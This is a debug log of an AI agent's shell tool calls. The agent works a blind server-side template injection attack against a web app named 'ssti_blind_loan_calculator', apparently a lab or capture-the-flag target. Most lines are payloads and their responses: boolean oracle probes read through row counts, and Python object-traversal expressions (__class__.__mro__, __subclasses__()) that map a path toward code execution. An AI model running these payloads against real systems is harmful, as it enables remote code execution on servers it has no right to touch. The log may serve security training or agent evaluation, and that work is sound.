+[debug] [main] Tool Call: bash | target: cd /tmp; source probe.sh echo "=== strings ===" p "'a'" p "'ab'" p "'abc'" p "'a'=='a'" p "'abc'.__len__()==3" echo "=== junk ===" p "xyz" p "x" p "xyzzy"
+[debug] [main] Tool Result: bash (success=true) -> === strings ===
+term=['a'] code=500 rows=0
+term=['ab'] code=500 rows=0
+term=['abc'] code=500 rows=0
+term=['a'=='a'] code=200 rows=2
+term=['abc'.__len__()==3] code=200 rows=2
+=== junk ===
+term=[xyz] code=500 rows=0
+term=[x] code=500 rows=0
+term=[xyzzy] code=500 rows=0
+[debug] [telemetry] Model tokens: prompt=23668, completion=158
+[debug] [main] Tool Call: bash | target: cd /tmp # offline proxy-free sanity: what does a template server render for junk? python3 - <<'EOF' import re tmpl = "<p>TERM {{ term }}</p>" for expr in ["x"*…
+[debug] [main] Tool Result: bash (success=true) -> 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' -> <p>TERM xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p>
+'x' -> <p>TERM x</p>
+'1' -> <p>TERM 1</p>
+"'a'=='a'" -> <p>TERM 'a'=='a'</p>
+if t... (truncated, total 480 bytes)
+[debug] [telemetry] Model tokens: prompt=23943, completion=116
+[debug] [main] Tool Call: bash | target: cd /tmp # does registering a second user produce a different row count / profile display? (session context vs hardcoded) curl -s -i --max-time 15 -X POST http:…
+[debug] [main] Tool Result: bash (success=true) -> 
+[debug] [telemetry] Model tokens: prompt=24063, completion=215
+[debug] [main] Tool Call: bash | target: cd /tmp echo -n "register: "; curl -s -o /dev/null -w "%{http_code} %{size_download}\n" --max-time 15 -X POST http://ssti_blind_loan_calculator/register -d 'us…
+[debug] [main] Tool Result: bash (success=true) -> register: 000 0
+signup:   404 207
+register GET: 404
+signup GET:   404
+[debug] [telemetry] Model tokens: prompt=24313, completion=231
+[debug] [main] Tool Call: bash | target: cd /tmp; source probe.sh echo "=== catalog probes (2/3 pattern: True=T, False=F) ===" p "''.__class__.__mro__[1].__subclasses__()==[]" p "''.__class__.__mro__[…
+[debug] [main] Tool Result: bash (success=true) -> === catalog probes (2/3 pattern: True=T, False=F) ===
+term=[''.__class__.__mro__[1].__subclasses__()==[]] code=200 rows=1
+term=[''.__class__.__mro__[1].__subclasses__().count(1)==0] code=200 rows=2
+term=[''.__class__.__mro__[1].__subclasses__()[-1]==1] code=200 rows=1
+term=[''.__class__.__mro__[1].__subclasses__().__len__()==0] code=200 rows=1
+term=[''.__class__.__mro__[1].__subclasses__()==[None]... (truncated, total 742 bytes)
+[debug] [telemetry] Model tokens: prompt=24813, completion=205
+[debug] [main] Tool Call: bash | target: cd /tmp; source probe.sh echo "=== mro ladder ===" p "'a'.__class__.__mro__[0]==''.__class__" p "'a'.__class__.__mro__[1]==().__class__" p "'a'.__class__.__mro…
+[debug] [main] Tool Result: bash (success=true) -> === mro ladder ===
+term=['a'.__class__.__mro__[0]==''.__class__] code=200 rows=2
+term=['a'.__class__.__mro__[1]==().__class__] code=200 rows=1
+term=['a'.__class__.__mro__[1]==().__class__.__base__] code=200 rows=2
+term=['a'.__class__.__mro__[1]==().__class__.__bases__[0]] code=200 rows=2
+term=['a'.__class__.__mro__[1].__name__=='object'] code=200 rows=2
+term=['a'.__class__.__mro__[1].__name__=='O'... (truncated, total 680 bytes)
